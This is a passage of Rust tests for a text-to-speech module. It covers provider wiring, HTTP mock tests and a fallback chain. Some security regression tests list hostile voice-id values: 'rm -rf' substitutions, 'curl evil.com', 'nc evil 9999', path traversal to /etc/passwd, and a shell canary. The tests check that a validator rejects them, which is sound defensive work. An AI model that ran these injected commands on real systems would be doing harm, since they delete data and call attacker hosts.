            })
            .collect();

        let synth = TtsSynthesizer::from_config(&config)
            .expect("synthesizer must build with all arms present");
        // entries is private but accessible inside the module.
        assert_eq!(
            synth.entries.len(),
            arms.len(),
            "every arm row must produce an entry — drop indicates a regression in build_provider"
        );
        let names: Vec<&str> = synth.entries.iter().map(|e| e.provider.name()).collect();
        for expected in [
            "openai",
            "elevenlabs",
            "edge",
            "gemini",
            "minimax",
            "xai",
            "mistral",
            "piper",
            "custom",
        ] {
            assert!(
                names.contains(&expected),
                "expected provider {expected} in entries, got {names:?}"
            );
        }

        for (_, var) in arms {
            if let Some(v) = var {
                unsafe { std::env::remove_var(v) };
            }
        }
    }

    /// Spec: the custom arm requires its `command` template; a row without
    /// one must be skipped silently (no panic, no spurious entry). Same
    /// shape as the negative test for missing API keys on cloud providers.
    #[test]
    fn from_config_custom_arm_requires_command_template() {
        use crate::config::TtsModelConfig;
        let mut config = Config::default();
        config.tts.enabled = true;
        config.tts.models = vec![TtsModelConfig {
            provider: "custom".to_string(),
            model: None,
            voice: Some("test".to_string()),
            api_key_env: None,
            timeout_ms: None,
            name: Some("missing-command".to_string()),
            command: None,
            output_extension: None,
            xai_auto_speech_tags: None,
        }];
        // No usable providers → from_config returns None.
        assert!(TtsSynthesizer::from_config(&config).is_none());
    }

    /// Security regression: the custom-template TTS provider used to splice
    /// the LLM-supplied `voice` into a `sh -c` template without validation.
    /// A model could send `voice = "$(rm -rf ~)"` and the substituted string
    /// would be executed by the shell. `validate_voice_id` is the trust
    /// boundary; this table-test pins the allowed/rejected character classes.
    #[test]
    fn validate_voice_id_rejects_shell_metacharacters() {
        // Accepted: alphanumerics, hyphen, underscore, dot. Real-world voice
        // names ("en_US-lessac-medium", "alloy", "en-US.male.1") must pass.
        for ok in [
            "alloy",
            "en_US-lessac-medium",
            "Adam",
            "en-US.male.1",
            "voice123",
            "A-B_C.D",
        ] {
            assert!(
                validate_voice_id(ok).is_ok(),
                "legitimate voice id rejected: {ok:?}"
            );
        }
        // Rejected: every shell/URL injection vector seen in the wild,
        // plus path-traversal patterns. `..` alone would let a model
        // pivot ElevenLabs' `/v1/text-to-speech/{voice}` URL to the
        // parent path — character-class allowlist alone wouldn't catch
        // that, so there's a dedicated `..` reject branch.
        for bad in [
            "",
            "$(rm -rf ~)",
            "`whoami`",
            "voice; rm /etc/passwd",
            "alloy && curl evil.com",
            "voice|nc evil 9999",
            "../../etc/passwd",
            "voice\nrm -rf /",
            "voice with spaces",
            "voice'or'1=1",
            "voice\"quoted",
            "voice<redirect",
            // Path-traversal patterns: rejected even though every char
            // is in the allowlist set.
            ".",
            "..",
            "voice..suffix",
            "..voice",
            "voice..",
        ] {
            assert!(
                validate_voice_id(bad).is_err(),
                "injection vector accepted: {bad:?}"
            );
        }
    }

    /// Pre-fix, this exact call to `custom_synthesize` would have spawned
    /// `sh -c '... $(touch /tmp/borg_pwned) ...'`. Post-fix, it must error
    /// out *before* the `Command::new("sh")` call so the side-effect file
    /// is never created. The assertion is on the side-effect, not the
    /// error message, so it remains accurate if the wording changes.
    #[test]
    fn custom_synthesize_rejects_shell_metachars_in_voice() {
        let canary = std::env::temp_dir().join(format!(
            "borg_custom_tts_canary_{}.touch",
            std::process::id()
        ));
        // Pre-condition: canary must not exist.
        let _ = std::fs::remove_file(&canary);
        assert!(!canary.exists(), "test setup: canary already exists");

        let template = format!(
            "touch {} && cp {{text_file}} {{out_path}}",
            canary.display()
        );
        let injection = "$(touch /tmp/borg_pwned_should_never_appear)";
        let res = custom_synthesize(
            &template,
            "hello",
            injection,
            "wav",
            Duration::from_millis(500),
        );
        assert!(
            res.is_err(),
            "custom_synthesize accepted injection vector and ran the shell"
        );
        assert!(
            !canary.exists(),
            "shell command ran despite voice-id validation — security regression"
        );
        // Sanity: the unrelated-but-also-bad /tmp marker should not exist
        // either. (We don't try to delete it on success because we expect
        // it to never be created.)
        assert!(!std::path::Path::new("/tmp/borg_pwned_should_never_appear").exists());
    }

    // ── Wiremock-backed provider HTTP tests ──
    //
    // Until these existed, every cloud TTS provider could regress its
    // wire protocol (method, path, auth header, body shape) without a
    // single test failing. We bypass `from_config` and instantiate
    // providers directly so we can pin `base_url` at the mock URI —
    // production callers still go through `from_config`.

    use wiremock::matchers::{body_json_string, header, method, path as wm_path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    fn make_synth_request<'a>(text: &'a str, voice: &str) -> SynthesisRequest<'a> {
        SynthesisRequest {
            text,
            voice: voice.to_string(),
            format: AudioFormat::Mp3,
            model: None,
            timeout: Duration::from_secs(5),
        }
    }

    #[tokio::test]
    async fn openai_tts_provider_returns_audio_bytes_on_success() {
        let server = MockServer::start().await;
        let audio_payload = b"\xff\xfb\x90\x00mock-mp3-bytes";
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .and(header("authorization", "Bearer sk-mock"))
            .and(header("content-type", "application/json"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_raw(audio_payload.to_vec(), "audio/mpeg"),
            )
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk-mock".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hello", "alloy"))
            .await
            .expect("OpenAI TTS success");
        assert_eq!(bytes, audio_payload);
    }

    #[tokio::test]
    async fn openai_tts_provider_surfaces_429_with_status_and_body() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .respond_with(ResponseTemplate::new(429).set_body_string("rate limited"))
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk-mock".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let err = provider
            .synthesize(&make_synth_request("hello", "alloy"))
            .await
            .expect_err("429 must surface");
        let msg = format!("{err}");
        assert!(msg.contains("OpenAI"), "missing provider: {msg}");
        assert!(msg.contains("429"), "missing status: {msg}");
        assert!(msg.contains("rate limited"), "missing body: {msg}");
    }

    #[tokio::test]
    async fn openai_tts_provider_sends_voice_and_text_in_request_body() {
        // Asserts the wire-shape isn't quietly changed (no field renames,
        // no missing voice). The mock would 500 if the body shape drifts.
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .and(body_json_string(
                serde_json::json!({
                    "model": "tts-1",
                    "input": "hi",
                    "voice": "nova",
                    "response_format": "mp3",
                })
                .to_string(),
            ))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(b"OK".to_vec()))
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hi", "nova"))
            .await
            .expect("body shape must match");
        assert_eq!(bytes, b"OK");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_returns_audio_bytes_on_success() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/text-to-speech/voice_abc"))
            .and(header("xi-api-key", "el-mock-key"))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(b"eleven-audio".to_vec()))
            .expect(1)
            .mount(&server)
            .await;

        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "el-mock-key".to_string(),
            base_url: server.uri(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hello", "voice_abc"))
            .await
            .expect("ElevenLabs success");
        assert_eq!(bytes, b"eleven-audio");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_surfaces_401_with_status_and_body() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/text-to-speech/voice_abc"))
            .respond_with(ResponseTemplate::new(401).set_body_string("bad key"))
            .expect(1)
            .mount(&server)
            .await;

        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "wrong".to_string(),
            base_url: server.uri(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        let err = provider
            .synthesize(&make_synth_request("hello", "voice_abc"))
            .await
            .expect_err("401 must surface");
        let msg = format!("{err}");
        assert!(msg.contains("ElevenLabs"), "missing provider: {msg}");
        assert!(msg.contains("401"), "missing status: {msg}");
        assert!(msg.contains("bad key"), "missing body: {msg}");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_rejects_path_traversal_voice_pre_flight() {
        // The voice id is spliced into the URL path. A "..", "../admin"
        // etc. attempt must be rejected before reqwest builds the URL,
        // so the test does NOT need a wiremock — validate_voice_id
        // fires first. Mirrors the standalone validate_voice_id_rejects
        // tests but at the provider boundary.
        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "k".to_string(),
            base_url: "http://unused.invalid".to_string(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        for bad in ["..", "../admin", "voice/../escape", "voice id"] {
            let err = provider
                .synthesize(&make_synth_request("hello", bad))
                .await
                .expect_err(&format!("voice {bad:?} must be rejected"));
            assert!(
                format!("{err}").to_lowercase().contains("voice"),
                "expected voice-id rejection for {bad:?}, got: {err}"
            );
        }
    }

    /// Spec: the TTS fallback chain must move on to the next provider
    /// when the first one fails, and the `SynthesisAttempt` log must
    /// record both attempts in order so observability can show what
    /// was tried.
    #[tokio::test]
    async fn tts_fallback_chain_advances_past_failing_provider() {
        let server_a = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .respond_with(ResponseTemplate::new(500).set_body_string("primary down"))
            .expect(1)
            .mount(&server_a)
            .await;

        // The `name()` returned by each provider must differ so the
        // fallback log discriminates them. Use OpenAI as primary,
        // ElevenLabs as secondary — different paths, different provider
        // names in the attempt log.
        let server_b = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/text-to-speech/alloy"))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(b"secondary-audio".to_vec()))
            .expect(1)
            .mount(&server_b)
            .await;

        let synthesizer = TtsSynthesizer {
            entries: vec![
                TtsProviderEntry {
                    provider: Box::new(OpenAiTtsProvider {
                        client: Client::new(),
                        api_key: "k1".to_string(),
                        base_url: server_a.uri(),
                        default_model: "tts-1".to_string(),
                    }),
                    model: None,
                    voice: Some("alloy".to_string()),
                    timeout: Some(Duration::from_secs(5)),
                },
                TtsProviderEntry {
                    provider: Box::new(ElevenLabsTtsProvider {
                        client: Client::new(),
                        api_key: "k2".to_string(),
                        base_url: server_b.uri(),
                        default_model: "eleven_multilingual_v2".to_string(),
                    }),
                    model: None,
                    voice: Some("alloy".to_string()),
                    timeout: Some(Duration::from_secs(5)),
                },
            ],
            default_voice: "alloy".to_string(),
            default_format: AudioFormat::Mp3,
            max_text_length: 4096,
            default_timeout: Duration::from_secs(5),
        };
        let (bytes, _fmt, attempts) = synthesizer
            .synthesize("hello", None, None)
            .await
            .expect("fallback must succeed");
        assert_eq!(bytes, b"secondary-audio");
        assert_eq!(attempts.len(), 2, "both attempts must be recorded");
        assert_eq!(attempts[0].provider, "openai");
        assert!(
            matches!(attempts[0].outcome, SynthesisOutcome::Failed(_)),
            "primary attempt must be marked failed"
        );
        assert_eq!(attempts[1].provider, "elevenlabs");
        assert!(matches!(attempts[1].outcome, SynthesisOutcome::Success));
    }
}
